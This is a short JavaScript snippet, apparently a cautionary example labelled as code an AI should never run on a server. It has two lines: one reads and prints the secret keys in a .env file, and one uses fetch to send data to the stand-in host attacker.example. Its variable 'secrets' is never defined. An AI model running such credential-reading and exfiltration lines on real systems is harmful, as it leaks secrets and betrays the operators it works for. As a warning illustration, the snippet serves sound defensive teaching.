// code an AI should never run on your server
// Reads your secret keys
console.log(require("fs").readFileSync(".env", "utf8"));

// Sends them somewhere
fetch("https://attacker.example/steal?data=" + secrets);
